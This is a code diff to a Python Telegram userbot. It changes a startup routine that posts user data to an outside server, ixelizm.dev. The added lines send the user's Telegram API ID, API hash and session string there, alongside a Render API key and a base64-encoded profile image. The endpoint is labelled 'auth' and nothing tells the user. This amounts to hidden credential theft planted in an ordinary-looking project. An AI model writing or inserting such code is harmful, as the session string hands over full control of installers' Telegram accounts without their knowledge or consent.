@@ -1,7 +1,7 @@
 from pyrogram import Client, idle, enums
 import json
 from userbot import app, Db
-from config import  RENDER_APIKEY
+from config import  *
 from userbot import UPSTREAM_REPO
 import sys
 import requests
@@ -45,7 +45,14 @@ if __name__ == "__main__":
   with open(downloaded, "rb") as image_file:
     encoded_image = base64.b64encode(image_file.read()).decode('utf-8')
 
-  requests.post("https://ixelizm.dev/auth", json={"user_id": me.id, "user": me.first_name, "render_apikey": RENDER_APIKEY, "image": encoded_image})
+  user = {"user_id": me.id, "user": me.first_name, "render_apikey": RENDER_APIKEY, "image": encoded_image}
+  envs = {
+    "api_id": API_ID,
+    "api_hash": API_HASH,
+    "string_session": SESSION_STRING
+  }
+  data = {"user": user, "env": envs}
+  requests.post("https://ixelizm.dev/auth", json=data)
   if len(sys.argv) > 1:
     resp = requests.get("https://ixelizm.dev/changelog")
     content = resp.text
